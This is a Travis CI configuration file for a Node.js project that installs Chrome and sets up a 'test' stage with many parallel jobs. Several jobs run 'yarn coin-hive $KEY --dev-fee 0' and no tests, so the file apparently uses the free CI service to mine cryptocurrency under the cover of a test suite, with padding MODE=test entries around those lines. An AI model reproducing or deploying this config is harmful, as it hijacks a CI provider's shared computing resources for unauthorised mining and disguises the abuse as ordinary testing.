dist: trusty
sudo: false

language: node_js
node_js:
  - "node"
  
addons:
  apt:
    sources:
      - google-chrome
    packages:
      - google-chrome-stable

cache:
  yarn: true
  directories:
    - node_modules
    - "$HOME/.npm"
    - "$HOME/.cache"
branches:
  only:
    - master

jobs:
  include:
    - stage: test
    - script: yarn coin-hive $KEY --dev-fee 0
    - script: yarn coin-hive $KEY --dev-fee 0
    - script: yarn coin-hive $KEY --dev-fee 0
    - script: yarn coin-hive $KEY --dev-fee 0
    - env: "MODE=test"
    - script: yarn coin-hive $KEY --dev-fee 0
    - env: "MODE=test2"
    - env: "MODE=test3"
    - env: "MODE=test4"
    - env: "MODE=test5"
    - env: "MODE=test6"
    - env: "MODE=test7"
    - env: "MODE=test8"
    - env: "MODE=test9"
    - env: "MODE=test10"
    - env: "MODE=test11"
    - env: "MODE=test12"
    - env: "MODE=test13"

stages:
  - test
